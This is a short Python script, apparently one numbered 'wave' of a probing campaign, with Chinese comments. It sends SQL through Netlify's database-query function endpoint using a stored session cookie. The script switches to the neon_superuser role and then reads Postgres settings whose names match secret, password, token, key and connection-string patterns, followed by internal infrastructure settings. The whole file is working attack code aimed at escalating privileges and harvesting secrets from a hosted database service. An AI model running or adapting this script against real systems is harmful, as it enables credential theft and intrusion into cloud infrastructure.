# -*- coding: utf-8 -*-
"""波20:SET ROLE neon_superuser -> pg_monitor -> pg_read_all_settings 读敏感 GUC
M1 密钥类 GUC / M2 全量对比(找 super-only 设置)/ M3 连接串/内部地址类
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:8000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# M1: 密钥/密码/token/连接类 GUC(set role 后读)
s, b, dt = tx(["set role neon_superuser",
               "select name, setting, source from pg_settings where name ~* 'pass|secret|token|key|connstr|uri|url|credential' and name not like 'ssl%' order by name"])
print('M1_secret_guc    [%d] %.1fs' % (s, dt))
print('   ' + b[:6000])
print()

# M2: 敏感面关键字 GUC(全量筛选 super 视角)
s, b, dt = tx(["set role neon_superuser",
               "select name, setting from pg_settings where name ~* 'neon|page|safekeeper|storage|endpoint|host|listen|archive|recovery|promote|cluster' order by name"])
print('M2_infra_guc     [%d] %.1fs' % (s, dt))
print('   ' + b[:6000])
